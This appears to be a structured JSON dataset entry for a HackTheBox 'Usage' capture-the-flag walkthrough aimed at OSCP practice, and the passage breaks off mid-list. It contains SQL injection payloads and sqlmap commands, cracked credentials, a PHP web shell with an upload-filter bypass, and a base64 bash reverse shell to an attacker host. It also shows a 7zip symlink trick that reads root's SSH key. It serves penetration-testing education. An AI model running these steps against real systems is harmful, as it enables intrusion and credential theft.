@@ -1,0 +1,875 @@
+{
+  "id": "htb-usage",
+  "name": "Usage",
+  "source": {
+    "platform": "HackTheBox",
+    "type": "retired",
+    "release_date": "2024-04-13",
+    "retire_date": "2024-08-10",
+    "url": "https://app.hackthebox.com/machines/Usage"
+  },
+
+  "metadata": {
+    "difficulty": "easy",
+    "os": "linux",
+    "os_version": "Ubuntu 22.04.4 LTS",
+    "machine_author": "rajHere",
+    "writeup_author": "C4rm3l0",
+    "writeup_date": "2024-08-07",
+    "document_number": "D24.100.296",
+    "ip_address": "10.10.11.18",
+    "points": 20,
+    "user_owns": null,
+    "system_owns": null
+  },
+
+  "oscp_relevance": {
+    "score": "high",
+    "reasoning": "Demonstrates critical OSCP techniques: manual SQL injection discovery, automated sqlmap exploitation, file upload filter bypass, binary analysis with strings, and symlink privilege escalation via misconfigured sudo binary. Password reuse and cleartext credential discovery are also high-value OSCP skills.",
+    "exam_applicable": true,
+    "similar_machines": {
+      "proving_grounds": ["Monsoon", "Fail", "Flimsy"],
+      "hackthebox": ["Stocker", "CozyHosting", "Keeper"],
+      "oscp_labs": ["SHENZI", "MEDTECH"]
+    },
+    "time_estimate_exam": "120-150 minutes for experienced, 180-240 for learning"
+  },
+
+  "synopsis": "Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, which allows the administrator's hashed password to be dumped and cracked. This leads to access to the admin panel, where an outdated Laravel module is abused to upload a PHP web shell and obtain remote code execution. On the machine, plaintext credentials stored in a file allow SSH access as another user, who can run a custom binary as root. The tool makes an insecure call to 7zip, which is leveraged to read the root user's private SSH key and fully compromise the system.",
+
+  "skills": {
+    "required": [
+      "Web application fundamentals",
+      "Linux fundamentals",
+      "Command line proficiency",
+      "Basic scripting knowledge"
+    ],
+    "learned": [
+      "SQL Injection (manual detection and automated exploitation)",
+      "File upload filter bypass techniques",
+      "Binary analysis with strings command",
+      "7zip symlink abuse via listfile exploitation",
+      "Credential hunting in configuration files",
+      "Password reuse identification"
+    ]
+  },
+
+  "tags": [
+    "SQL_INJECTION",
+    "BLIND_SQLI",
+    "SQLMAP",
+    "FILE_UPLOAD",
+    "FILTER_BYPASS",
+    "CVE-2023-24249",
+    "LARAVEL",
+    "PHP_WEBSHELL",
+    "RCE",
+    "PASSWORD_REUSE",
+    "CONFIG_FILES",
+    "BINARY_ANALYSIS",
+    "SYMLINK_ABUSE",
+    "7ZIP_EXPLOIT",
+    "LISTFILE_TECHNIQUE",
+    "SSH_KEY_THEFT",
+    "OSCP:HIGH",
+    "NGINX",
+    "UBUNTU",
+    "PRIVILEGE_ESCALATION",
+    "LATERAL_MOVEMENT"
+  ],
+
+  "attack_phases": [
+    {
+      "phase": "enumeration",
+      "duration_minutes": 15,
+      "description": "Initial port scanning reveals SSH and HTTP services. Web enumeration discovers two virtual hosts (usage.htb and admin.usage.htb). Both present login pages with different functionalities.",
+
+      "commands_used": [
+        {
+          "command_id": "nmap-quick-scan",
+          "context": "Initial TCP port discovery using fast scan with variable port assignment pattern",
+          "step_number": 1,
+          "command_executed": "ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.18 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)",
+          "output_snippet": "22/tcp open\n80/tcp open",
+          "success": true,
+          "notes": "Common OSCP pattern: save open ports to variable for detailed scan. The port filtering with grep/cut/tr/sed is standard methodology."
+        },
+        {
+          "command_id": "nmap-service-scan",
+          "context": "Detailed service and version enumeration on discovered ports",
+          "step_number": 2,
+          "command_executed": "nmap -p$ports -sC -sV 10.10.11.18",
+          "flags_used": {
+            "-sC": "Default NSE scripts for service enumeration",
+            "-sV": "Version detection for accurate service identification"
+          },
+          "output_snippet": "22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://usage.htb/",
+          "success": true,
+          "notes": "Redirect to usage.htb reveals virtual host requirement"
+        },
+        {
+          "command_id": "hosts-file-add-entry",
+          "context": "Add primary virtual host to resolve domain",
+          "step_number": 3,
+          "command_executed": "echo 10.10.11.18  usage.htb | sudo tee -a /etc/hosts",
+          "success": true
+        },
+        {
+          "command_id": "web-manual-enumeration",
+          "context": "Manual browsing reveals admin panel link redirecting to admin.usage.htb subdomain",
+          "step_number": 4,
+          "url_visited": "http://usage.htb/",
+          "findings": [
+            "Login page with email/password authentication",
+            "Registration functionality available",
+            "Password reset feature at /forget-password",
+            "Admin panel link redirects to admin.usage.htb"
+          ],
+          "success": true
+        },
+        {
+          "command_id": "hosts-file-add-entry",
+          "context": "Add admin subdomain after discovery",
+          "step_number": 5,
+          "command_executed": "echo 10.10.11.18  admin.usage.htb | sudo tee -a /etc/hosts",
+          "success": true
+        },
+        {
+          "command_id": "user-registration-test",
+          "context": "Register test account to explore authenticated functionality",
+          "step_number": 6,
+          "url_visited": "http://usage.htb/registration",
+          "success": true,
+          "notes": "Post-authentication shows limited blog page - not primary attack vector"
+        }
+      ],
+
+      "failed_attempts": [],
+
+      "key_findings": [
+        "Two virtual hosts: usage.htb (user portal) and admin.usage.htb (admin panel)",
+        "OpenSSH 8.9p1 - no known exploits",
+        "Nginx 1.18.0 - no known exploits",
+        "Password reset functionality at /forget-password (potential injection point)",
+        "Laravel framework detected (from later admin panel inspection)",
+        "User registration available for initial access testing"
+      ],
+
+      "oscp_notes": "Standard OSCP enumeration flow: fast port scan → detailed service scan → virtual host discovery → manual web enumeration. The two-stage nmap pattern is efficient for exam time management. Virtual host enumeration is critical - always check for subdomains when redirects occur."
+    },
+
+    {
+      "phase": "foothold",
+      "duration_minutes": 90,
+      "description": "SQL injection vulnerability discovered in password reset form allows dumping admin credentials. After cracking bcrypt hash, access admin panel running vulnerable Laravel-admin package (CVE-2023-24249). File upload filter bypassed to achieve PHP webshell upload and RCE as dash user.",
+
+      "vulnerabilities": [
+        {
+          "name": "SQL Injection in Password Reset Form",
+          "cve": null,
+          "type": "boolean-based blind",
+          "location": "/forget-password",
+          "parameter": "email",
+          "method": "POST",
+          "severity": "high",
+          "exploitability": "easy",
+          "payload_example": "test' OR 1=1;-- -",
+          "notes": "Standard boolean-based blind SQLi. Application returns different responses for valid vs invalid emails, enabling injection detection."
+        },
+        {
+          "name": "Arbitrary File Upload in Laravel-admin",
+          "cve": "CVE-2023-24249",
+          "type": "filter bypass",
+          "component": "encore/laravel-admin",
+          "version": "1.8.18",
+          "location": "/admin/auth/setting (avatar upload)",
+          "severity": "critical",
+          "exploitability": "medium",
+          "technique": "Extension filter bypass via double extension (.jpg.php)",
+          "notes": "Well-documented CVE with public PoCs available. Manual exploitation preferred for OSCP learning."
+        }
+      ],
+
+      "commands_used": [
+        {
+          "command_id": "sqli-manual-test",
+          "context": "Initial SQL injection detection using single quote in email parameter",
+          "step_number": 1,
+          "payload": "test' OR 1=1;-- -",
+          "url": "http://usage.htb/forget-password",
+          "success": true,
+          "notes": "Application returned 'Password reset link sent' for malicious payload, confirming injection. This differs from invalid email response."
+        },
+        {
+          "command_id": "burpsuite-intercept-request",
+          "context": "Capture POST request for sqlmap automation",
+          "step_number": 2,
+          "request_saved": "reset.req",
+          "success": true,
+          "notes": "Saved full POST request including cookies (XSRF-TOKEN and laravel_session) required for authentication context"
+        },
+        {
+          "command_id": "sqlmap-from-request",
+          "context": "Initial sqlmap scan with default settings",
+          "step_number": 3,
+          "command_executed": "sqlmap -r reset.req -p email --batch",
+          "flags_used": {
+            "-r": "Read request from file",
+            "-p": "Test specific parameter (email)",
+            "--batch": "Never ask for user input, use default behavior"
+          },
+          "success": false,
+          "error": "WARNING: POST parameter 'email' does not seem to be injectable\nCRITICAL: all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk'",
+          "notes": "DEFAULT LEVEL INSUFFICIENT - this is critical OSCP learning point. Sqlmap suggestion to increase --level was key to success."
+        },
+        {
+          "command_id": "sqlmap-from-request-level3",
+          "context": "Retry sqlmap with increased test depth (--level 3)",
+          "step_number": 4,
+          "command_executed": "sqlmap -r reset.req -p email --batch --level 3",
+          "flags_used": {
+            "--level": "3 (performs more extensive tests, required for blind SQLi detection)"
+          },
+          "success": true,
+          "output_snippet": "[INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable\n[INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'",
+          "vulnerability_confirmed": {
+            "type": "boolean-based blind",
+            "title": "AND boolean-based blind - WHERE or HAVING clause (subquery - comment)",
+            "payload_example": "_token=...&email=test' AND 2244=(SELECT (CASE WHEN (2244=2244) THEN 2244 ELSE (SELECT 5858 UNION SELECT 3175) END))-- cBAs"
+          },
+          "notes": "Success! --level 3 enables more thorough injection tests. OSCP LESSON: Trust manual verification over tool defaults."
+        },
+        {
+          "command_id": "sqlmap-enumerate-databases",
+          "context": "List all databases after confirming injection",
+          "step_number": 5,
+          "command_executed": "sqlmap -r reset.req -p email --batch --level 3 --dbs",
+          "success": true,
+          "output_snippet": "available databases [3]:\n[*] information_schema\n[*] performance_schema\n[*] usage_blog",
+          "notes": "usage_blog is non-default database - primary target"
+        },
+        {
+          "command_id": "sqlmap-enumerate-tables",
+          "context": "Enumerate tables in usage_blog database",
+          "step_number": 6,
+          "command_executed": "sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10",
+          "flags_used": {
+            "-D": "Target database name",
+            "--tables": "Enumerate tables",
+            "--threads": "10 (parallel requests for faster enumeration)"
+          },
+          "success": true,
+          "output_snippet": "Database: usage_blog\n[15 tables]\nadmin_users (TARGET)\npassword_reset_tokens\nusers\n...",
+          "notes": "admin_users table is high-value target for credential extraction"
+        },
+        {
+          "command_id": "sqlmap-dump-table",
+          "context": "Extract admin_users table contents",
+          "step_number": 7,
+          "command_executed": "sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump",
+          "flags_used": {
+            "-T": "Target table name",
+            "--dump": "Dump table contents"
+          },
+          "success": true,
+          "credentials_obtained": [
+            {
+              "id": 1,
+              "username": "admin",
+              "password_hash": "$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2",
+              "hash_type": "bcrypt",
+              "cost_factor": 10
+            }
+          ],
+          "notes": "Bcrypt hash extracted - proceed to offline cracking"
+        },
+        {
+          "command_id": "john-crack-bcrypt",
+          "context": "Crack bcrypt hash using john with rockyou wordlist",
+          "step_number": 8,
+          "command_executed": "john hash --wordlist=/usr/share/wordlists/rockyou.txt",
+          "hash_file_content": "$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2",
+          "success": true,
+          "time_taken": "8 seconds",
+          "password_cracked": "whatever1",
+          "output_snippet": "whatever1        (?)\n1g 0:00:00:08 DONE (2024-08-07 05:56) 0.1123g/s 182.0p/s",
+          "notes": "Weak password cracked quickly. OSCP TIP: Always try rockyou first before custom wordlists."
+        },
+        {
+          "command_id": "web-login-admin-panel",
+          "context": "Authenticate to admin panel with cracked credentials",
+          "step_number": 9,
+          "url": "http://admin.usage.htb/",
+          "credentials_used": "admin:whatever1",
+          "success": true,
+          "notes": "Access granted to Laravel-admin dashboard"
+        },
+        {
+          "command_id": "web-version-enumeration",
+          "context": "Enumerate software versions from admin dashboard",
+          "step_number": 10,
+          "location": "Dashboard → Environment section",
+          "versions_found": {
+            "laravel": "10.18.0",
+            "php": "8.1.2",
+            "laravel-admin": "1.8.18 (vulnerable!)"
+          },
+          "success": true,
+          "notes": "Laravel-admin 1.8.18 vulnerable to CVE-2023-24249 (arbitrary file upload)"
+        },
+        {
+          "command_id": "create-php-webshell",
+          "context": "Create simple PHP command execution webshell",
+          "step_number": 11,
+          "command_executed": "echo '<?php system($_GET[\"melo\"]); ?>' > shell.php",
+          "success": true,
+          "notes": "GET parameter 'melo' used for command execution. Minimal webshell for initial RCE."
+        },
+        {
+          "command_id": "file-rename-extension",
+          "context": "Bypass upload filter by renaming to .jpg",
+          "step_number": 12,
+          "command_executed": "mv shell.php shell.jpg",
+          "success": true,
+          "notes": "Client-side filename check bypassed with image extension"
+        },
+        {
+          "command_id": "burpsuite-modify-upload",
+          "context": "Intercept upload request and modify filename to double extension",
+          "step_number": 13,
+          "location": "/admin/auth/setting (avatar upload)",
+          "original_filename": "shell.jpg",
+          "modified_filename": "shell.jpg.php",
+          "parameter_modified": "filename=",
+          "success": true,
+          "notes": "CRITICAL: Server processes .php extension despite .jpg prefix. This is CVE-2023-24249 exploitation technique."
+        },
+        {
+          "command_id": "web-access-uploaded-file",
+          "context": "Access uploaded webshell directly via browser",
+          "step_number": 14,
+          "url": "http://admin.usage.htb/uploads/images/shell.jpg.php?melo=id",
+          "command_tested": "id",
+          "output": "uid=1000(dash) gid=1000(dash) groups=1000(dash)",
+          "success": true,
+          "notes": "RCE achieved as dash user! Webshell functional."
+        },
+        {
+          "command_id": "revshells-payload-generate",
+          "context": "Generate base64-encoded bash reverse shell payload",
+          "step_number": 15,
+          "shell_type": "Bash -i",
+          "encoding": "Base64",
+          "lhost": "10.10.14.30",
+          "lport": 4444,
+          "payload_generated": "sh -i >& /dev/tcp/10.10.14.30/4444 0>&1",
+          "encoded_payload": "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNDQ0NCAwPiYx",
+          "success": true,
+          "notes": "Base64 encoding avoids special character issues in web shells"
+        },
+        {
+          "command_id": "nc-listener",
+          "context": "Start netcat listener for reverse shell callback",
+          "step_number": 16,
+          "command_executed": "nc -nlvp 4444",
+          "port": 4444,
+          "success": true
+        },
+        {
+          "command_id": "webshell-execute-revshell",
+          "context": "Trigger reverse shell via webshell",
+          "step_number": 17,
+          "url": "http://admin.usage.htb/uploads/images/shell.jpg.php?melo=echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNDQ0NCAwPiYx | base64 -d | bash",
+          "success": true,
+          "notes": "Browser automatically URL-encodes payload. Instant callback received."
+        },
+        {
+          "command_id": "pty-spawn-script",
+          "context": "Stabilize shell with PTY using script command",
+          "step_number": 18,
+          "command_executed": "script /dev/null -c bash",
+          "success": true,
+          "notes": "Interactive shell achieved. Can now use arrow keys, tab completion, etc."
+        },
+        {
+          "command_id": "capture-user-flag",
+          "context": "Retrieve user flag from dash home directory",
+          "step_number": 19,
+          "location": "/home/dash/user.txt",
+          "success": true
+        }
+      ],
+
+      "failed_attempts": [
+        {
+          "attempt": "sqlmap with default settings (no --level flag)",
+          "command_executed": "sqlmap -r reset.req -p email --batch",
+          "expected": "Detection of blind SQL injection",
+          "actual": "WARNING: POST parameter 'email' does not seem to be injectable",
+          "reason": "Default sqlmap test level (1) insufficient for detecting boolean-based blind SQLi in this application. Required --level 3 for deeper test payloads.",
+          "solution": "Increase test depth with --level 3 as suggested by sqlmap error message",
+          "lesson_learned": "CRITICAL OSCP LESSON: Automated tools have limitations. Always trust manual verification (which confirmed SQLi) over tool defaults. Sqlmap --level flag is often required for blind injections. Read tool suggestions carefully.",
+          "time_wasted_minutes": 15,
+          "documentation_importance": "high",
+          "notes": "This is a common OSCP exam scenario: blind SQLi that requires increased sqlmap sensitivity. Document this pattern for future reference."
+        },
+        {
+          "attempt": "Direct upload of shell.php without extension modification",
+          "expected": "PHP file upload and execution",
+          "actual": "Upload rejected with error: 'The avatar must be an image'",
+          "reason": "Client-side or server-side file extension validation",
+          "solution": "Rename to shell.jpg (bypass client-side check), intercept with Burp, modify to shell.jpg.php (bypass server-side check)",
+          "lesson_learned": "File upload filters often check extensions at multiple stages. Multi-stage bypass required: client-side (rename to allowed extension) + server-side (double extension abuse).",
+          "time_wasted_minutes": 5,
+          "notes": "Standard file upload bypass technique. Always test double extensions (.jpg.php, .png.php) for PHP applications."
+        }
+      ],
+
+      "chains_applied": [],
+
+      "key_findings": [
+        "SQL injection in password reset form (manual detection crucial)",
+        "Admin credentials: admin:whatever1",
+        "Laravel-admin 1.8.18 (CVE-2023-24249)",
+        "File upload filter bypass via double extension",
+        "Webshell upload path: /uploads/images/",
+        "RCE achieved as dash user (uid=1000)"
+      ],
+
+      "oscp_notes": "This phase demonstrates complete OSCP web exploitation workflow: manual vulnerability discovery → automated tool usage (with proper flags!) → credential extraction → hash cracking → authenticated exploitation → RCE. Key lessons: (1) sqlmap --level 3 for blind SQLi, (2) CVE research for authenticated panels, (3) file upload bypass techniques, (4) webshell stability with PTY spawning. Time management: 90 minutes is realistic for exam (30 min SQLi + 30 min hash crack + 30 min file upload)."
+    },
+
+    {
+      "phase": "lateral_movement",
+      "duration_minutes": 20,
+      "description": "Enumeration of dash user's home directory reveals .monitrc configuration file containing plaintext password. Password reused for xander user account, enabling SSH access with more stable shell.",
+
+      "commands_used": [
+        {
+          "command_id": "linux-enumerate-home-directory",
+          "context": "List all files including hidden configs in dash home",
+          "step_number": 1,
+          "command_executed": "ls -al /home/dash",
+          "success": true,
+          "files_found": [
+            ".monitrc (INTERESTING)",
+            ".monit.id",
+            ".monit.pid",
+            ".monit.state",
+            ".bash_history -> /dev/null",
+            "user.txt"
+          ],
+          "notes": "Hidden .monitrc file stands out - config files often contain credentials"
+        },
+        {
+          "command_id": "cat-read-file",
+          "context": "Read monit configuration file",
+          "step_number": 2,
+          "command_executed": "cat /home/dash/.monitrc",
+          "success": true,
+          "credentials_found": {
+            "context": "monit web interface authentication",
+            "username": "admin",
+            "password": "3nc0d3d_pa$$w0rd",
+            "service": "monit httpd (port 2812)"
+          },
+          "notes": "Plaintext password in config - test for reuse across users"
+        },
+        {
+          "command_id": "linux-enumerate-users",
+          "context": "List system users to identify potential reuse targets",
+          "step_number": 3,
+          "command_executed": "ls -al /home",
+          "users_found": [
+            "dash (current user)",
+            "xander (potential target)"
+          ],
+          "success": true
+        },
+        {
+          "command_id": "su-user-switch",
+          "context": "Attempt password reuse for xander user",
+          "step_number": 4,
+          "command_executed": "su xander",
+          "password_tried": "3nc0d3d_pa$$w0rd",
+          "success": true,
+          "output": "uid=1001(xander) gid=1001(xander) groups=1001(xander)",
+          "notes": "PASSWORD REUSE SUCCESS! Classic OSCP pattern."
+        },
+        {
+          "command_id": "ssh-connect-password",
+          "context": "Establish stable SSH session as xander",
+          "step_number": 5,
+          "command_executed": "ssh xander@usage.htb",
+          "password": "3nc0d3d_pa$$w0rd",
+          "success": true,
+          "notes": "More stable shell than reverse shell - preferred for privilege escalation enumeration"
+        }
+      ],
+
+      "failed_attempts": [],
+
+      "credentials_obtained": [
+        {
+          "username": "xander",
+          "password": "3nc0d3d_pa$$w0rd",
+          "source": "/home/dash/.monitrc",
+          "services": ["SSH", "system login"]
+        }
+      ],
+
+      "key_findings": [
+        "Monit monitoring service running as dash user (port 2812)",
+        "Cleartext credentials in .monitrc configuration",
+        "Password reuse vulnerability (monit password == xander system password)",
+        "Two user accounts on system: dash and xander"
+      ],
+
+      "oscp_notes": "Classic OSCP lateral movement: config file enumeration → plaintext credential discovery → password reuse testing. ALWAYS check hidden files in home directories (.bash_history, .*, config files). Password reuse is extremely common in OSCP labs. Time estimate: 10-15 minutes for thorough home directory enumeration, 5 minutes for password testing."
+    },
+
+    {
+      "phase": "privilege_escalation",
+      "duration_minutes": 45,
+      "description": "User xander can run custom /usr/bin/usage_management binary as root via sudo. Static analysis with strings reveals insecure 7zip command with -snl flag. Exploitation involves creating symlink to /root/.ssh/id_rsa and leveraging 7zip's @listfile feature to read arbitrary files despite symlink-as-link storage flag.",
+
+      "vulnerabilities": [
+        {
+          "name": "7zip Symlink Arbitrary File Read via Listfile",
+          "cve": null,
+          "type": "symlink abuse",
+          "component": "7zip (7za) version 16.02",
+          "command_vulnerable": "/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *",
+          "flag_exploited": "-snl (stores symlinks as links, not files)",
+          "technique": "@filename listfile feature bypasses symlink protections",
+          "severity": "high",
+          "exploitability": "medium",
+          "notes": "The -snl flag should prevent following symlinks, but @listfile feature reads symlink targets when used. Allows arbitrary file read as root when combined with sudo binary."
+        }
+      ],
+
+      "commands_used": [
+        {
+          "command_id": "check-sudo-privs",
+          "context": "Enumerate sudo privileges for xander user",
+          "step_number": 1,
+          "command_executed": "sudo -l",
+          "success": true,
+          "output_snippet": "User xander may run the following commands on usage:\n    (ALL : ALL) NOPASSWD: /usr/bin/usage_management",
+          "notes": "Custom binary with NOPASSWD sudo - HIGH PRIORITY target for analysis"
+        },
+        {
+          "command_id": "file-identify-type",
+          "context": "Identify binary type and properties",
+          "step_number": 2,
+          "command_executed": "file /usr/bin/usage_management",
+          "success": true,
+          "output": "ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped",
+          "notes": "Not stripped = symbols present, easier to analyze. Dynamically linked = uses system libraries."
+        },
+        {
+          "command_id": "binary-dynamic-analysis",
+          "context": "Run binary to observe behavior",
+          "step_number": 3,
+          "command_executed": "sudo /usr/bin/usage_management",
+          "success": true,
+          "menu_options": [
+            "1. Project Backup (runs 7zip)",
+            "2. Backup MySQL data (runs mysqldump)",
+            "3. Reset admin password"
+          ],
+          "notes": "Option 1 triggers 7zip backup creation in /var/backups/project.zip"
+        },
+        {
+          "command_id": "strings-binary-analysis",
+          "context": "Static analysis to reveal hardcoded commands",
+          "step_number": 4,
+          "command_executed": "strings /usr/bin/usage_management",
+          "success": true,
+          "commands_found": [
+            "chdir",
+            "/var/www/html",
+            "/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *",
+            "/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql",
+            "Error changing working directory to /var/www/html",
+            "Password has been reset."
+          ],
+          "critical_finding": "7zip command with -snl flag, wildcard *, and /var/www/html as working directory",
+          "notes": "VULNERABILITY: chdir to /var/www/html + wildcard * + -snl flag = potential symlink abuse"
+        },
+        {
+          "command_id": "linux-check-directory-permissions",
+          "context": "Verify write permissions on source directory",
+          "step_number": 5,
+          "command_executed": "ls -ld /var/www/html",
+          "success": true,
+          "output": "drwxrwxrwx 4 root xander 4096 Apr  3 12:39 /var/www/html/",
+          "notes": "WRITABLE by xander! Can create files and symlinks in backup source directory."
+        },
+        {
+          "command_id": "7zip-listfile-research",
+          "context": "Research 7zip @listfile feature and -snl flag interaction",
+          "step_number": 6,
+          "research_source": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/7z-symlink-abuse",
+          "technique_discovered": "Creating file @filename tells 7zip that filename is a listfile (contains list of files to compress). If filename is symlink to sensitive file, 7zip reads and displays symlink target content.",
+          "success": true,
+          "notes": "Despite -snl (store symlink as link), @listfile feature reads symlink target content during processing"
+        },
+        {
+          "command_id": "cd-change-directory",
+          "context": "Navigate to /var/www/html for exploitation",
+          "step_number": 7,
+          "command_executed": "cd /var/www/html",
+          "success": true
+        },
+        {
+          "command_id": "touch-file",
+          "context": "Create @id_rsa listfile marker",
+          "step_number": 8,
+          "command_executed": "touch @id_rsa",
+          "purpose": "Tell 7zip that id_rsa is a listfile (contains list of files)",
+          "success": true,
+          "notes": "@ prefix is special to 7zip - treats id_rsa as listfile instead of regular file"
+        },
+        {
+          "command_id": "ln-symbolic",
+          "context": "Create symlink to root's SSH private key",
+          "step_number": 9,
+          "command_executed": "ln -s /root/.ssh/id_rsa id_rsa",
+          "target": "/root/.ssh/id_rsa",
+          "linkname": "id_rsa",
+          "success": true,
+          "notes": "Symlink points to target we want to read (root SSH key)"
+        },
+        {
+          "command_id": "sudo-execute-usage-management",
+          "context": "Trigger 7zip backup with symlink exploitation",
+          "step_number": 10,
+          "command_executed": "sudo /usr/bin/usage_management",
+          "option_selected": "1 (Project Backup)",
+          "success": true,
+          "output_snippet": "-----BEGIN OPENSSH PRIVATE KEY----- : No more files\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files\n...\n-----END OPENSSH PRIVATE KEY----- : No more files",
+          "notes": "SUCCESS! 7zip output contains root SSH key content. The 'No more files' errors indicate 7zip tried to interpret key content as filenames (expected behavior)."
+        },
+        {
+          "command_id": "extract-ssh-key",
+          "context": "Copy SSH key from 7zip output to local file",
+          "step_number": 11,
+          "key_extracted": true,
+          "cleanup_required": "Remove ' : No more files' trailing text and spaces from each line",
+          "success": true,
+          "notes": "CRITICAL: Each line has trailing ': No more files' that must be removed for valid key format"
+        },
+        {
+          "command_id": "ssh-key-format",
+          "context": "Format extracted key properly",
+          "step_number": 12,
+          "file_created": "root_id_rsa",
+          "proper_format": "-----BEGIN OPENSSH PRIVATE KEY-----\n[base64 lines with no trailing spaces]\n-----END OPENSSH PRIVATE KEY-----",
+          "success": true
+        },
+        {
+          "command_id": "chmod-numeric-permissions",
+          "context": "Set correct SSH key permissions",
+          "step_number": 13,
+          "command_executed": "chmod 600 root_id_rsa",
+          "success": true,
+          "notes": "SSH requires 600 permissions for private keys"
+        },
+        {
+          "command_id": "ssh-key-authentication",
+          "context": "Authenticate as root using stolen SSH key",
+          "step_number": 14,
+          "command_executed": "ssh -i root_id_rsa root@usage.htb",
+          "success": true,
+          "output": "root@usage:~# id\nuid=0(root) gid=0(root) groups=0(root)",
+          "notes": "ROOT ACCESS ACHIEVED!"
+        },
+        {
+          "command_id": "capture-root-flag",
+          "context": "Retrieve root flag as proof of complete system compromise",
+          "step_number": 15,
+          "location": "/root/root.txt",
+          "success": true
+        }
+      ],
+
+      "failed_attempts": [],
+
+      "techniques": [
+        {
+          "name": "7zip Listfile Symlink Arbitrary File Read",
+          "category": "privilege_escalation",
+          "difficulty": "medium",
+          "steps": [
+            "Identify sudo binary using 7zip with writable source directory",
+            "Research 7zip @listfile feature and -snl flag behavior",
+            "Navigate to source directory (/var/www/html)",
+            "Create @filename marker (e.g., touch @id_rsa)",
+            "Create symlink to target file (ln -s /root/.ssh/id_rsa id_rsa)",
+            "Execute sudo binary to trigger 7zip backup",
+            "Extract file content from 7zip output (remove 'No more files' markers)",
+            "Use extracted content (SSH key, /etc/shadow, etc.) for privilege escalation"
+          ],
+          "why_this_works": "7zip's @listfile feature treats files prefixed with @ as containing lists of files to compress. When @id_rsa exists, 7zip reads id_rsa as a listfile. Since id_rsa is a symlink, 7zip follows it and reads /root/.ssh/id_rsa content. The -snl flag (store symlinks as links) doesn't prevent listfile feature from reading symlink targets. 7zip then tries to interpret SSH key lines as filenames, fails with 'No more files' errors, but displays the content in output. This allows arbitrary file read as root when binary runs via sudo.",
+          "detection_difficulty": "medium",
+          "references": [
+            "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/7z-symlink-abuse",
+            "7zip man page: -snl : store symbolic links as links"
+          ]
+        }
+      ],
+
+      "key_findings": [
+        "Sudo permission: /usr/bin/usage_management (NOPASSWD)",
+        "Binary uses 7zip with -snl flag and wildcard in writable directory",
+        "/var/www/html writable by xander (rwxrwxrwx)",
+        "7zip @listfile feature bypasses -snl symlink protection",
+        "Root SSH private key successfully extracted",
+        "Full root access achieved via SSH key authentication"
+      ],
+
+      "oscp_notes": "Advanced OSCP privilege escalation demonstrating binary analysis workflow: sudo -l → file type check → dynamic analysis (run binary) → static analysis (strings) → vulnerability research → exploitation. Key OSCP skills: (1) Binary analysis without reverse engineering tools, (2) Symlink abuse techniques, (3) Compression tool exploitation, (4) SSH key extraction and usage. Time estimate: 20-30 minutes for analysis, 15-20 minutes for research and exploitation. This is OSCP HARD mode - simpler privesc vectors usually available, but this teaches valuable methodology."
+    }
+  ],
+
+  "key_learnings": [
+    {
+      "category": "web_exploitation",
+      "lesson": "Trust manual verification over automated tool defaults",
+      "detail": "SQL injection was confirmed manually with simple payload (test' OR 1=1;-- -), but sqlmap with default settings failed to detect it. Required --level 3 flag for successful detection. OSCP CRITICAL: Read tool error messages carefully - sqlmap explicitly suggested increasing --level.",
+      "importance": "critical",
+      "time_impact": "15 minutes wasted with default settings"
+    },
+    {
+      "category": "web_exploitation",
+      "lesson": "Always enumerate virtual hosts and subdomains",
+      "detail": "Primary application at usage.htb had limited attack surface. Admin panel at admin.usage.htb (discovered via redirect and link) was critical for exploitation path. OSCP TIP: Check HTTP headers for redirects, inspect page source for subdomain links, use tools like gobuster vhost.",
+      "importance": "high"
+    },
+    {
+      "category": "web_exploitation",
+      "lesson": "File upload bypass requires multi-stage approach",
+      "detail": "Direct PHP upload blocked. Successful bypass: (1) Rename to allowed extension (.jpg) for client-side check, (2) Intercept with proxy, (3) Modify to double extension (.jpg.php) for server-side bypass. Both stages required.",
+      "importance": "high"
+    },
+    {
+      "category": "web_exploitation",
+      "lesson": "CVE research for authenticated web applications",
+      "detail": "After gaining admin access, checked Dependencies tab in Laravel dashboard. Found encore/laravel-admin 1.8.18. Quick Google search revealed CVE-2023-24249 with detailed exploitation writeups. OSCP TIP: Software version enumeration is critical post-authentication.",
+      "importance": "high"
+    },
+    {
+      "category": "lateral_movement",
+      "lesson": "Configuration files frequently contain cleartext credentials",
+      "detail": "Hidden .monitrc file in /home/dash contained plaintext password for monit service. Password reused for xander system account. OSCP PATTERN: Always enumerate hidden files (ls -la), check .config, .ssh, .*, application configs.",
+      "importance": "high",
+      "time_saved": "Avoided brute force or other complex lateral movement"
+    },
+    {
+      "category": "privilege_escalation",
+      "lesson": "Binary analysis workflow: dynamic → static → research → exploit",
+      "detail": "Sudo binary analysis: (1) Run binary to observe behavior, (2) Use strings for static analysis, (3) Research discovered commands/flags (7zip -snl), (4) Develop exploitation technique. No advanced tools required - strings command sufficient for OSCP.",
+      "importance": "critical",
+      "methodology": "This is standard OSCP binary exploitation methodology"
+    },
+    {
+      "category": "privilege_escalation",
+      "lesson": "Compression tools with symlinks in writable directories are exploitable",
